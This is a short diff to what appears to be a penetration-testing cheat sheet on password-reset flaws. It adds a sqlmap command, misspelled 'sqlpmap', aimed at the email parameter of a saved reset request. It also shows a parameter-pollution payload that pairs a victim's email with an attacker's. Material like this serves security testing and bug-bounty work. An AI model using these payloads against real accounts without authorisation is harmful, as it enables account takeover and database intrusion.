@@ -1,3 +1,9 @@
+#### Try sqlmap in the email parameter as backend involvement may occur 
+````
+sqlpmap -r pass_reset.txt -p email
+````
+
+
 #### Double parameter (aka. HPP / HTTP parameter pollution):
 - email=victim@xyz.tld&email=hacker@xyz.tld
 #### Carbon copy:
